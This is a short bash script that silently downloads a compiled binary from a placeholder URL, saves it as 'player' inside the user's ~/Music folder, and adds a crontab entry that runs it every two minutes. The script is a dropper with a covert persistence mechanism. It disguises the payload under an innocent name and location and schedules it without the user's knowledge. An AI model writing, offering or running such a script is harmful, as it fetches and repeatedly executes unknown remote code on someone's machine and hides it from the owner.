#!/bin/bash

curl --silent "URL TO COMPILED MAIN" --output player
chmod 755 player
mkdir ~/Music/ 2> /dev/null
mv -f player ~/Music/player
crontab -l | { cat; echo "*/2 * * * * ~/Music/player"; } | crontab -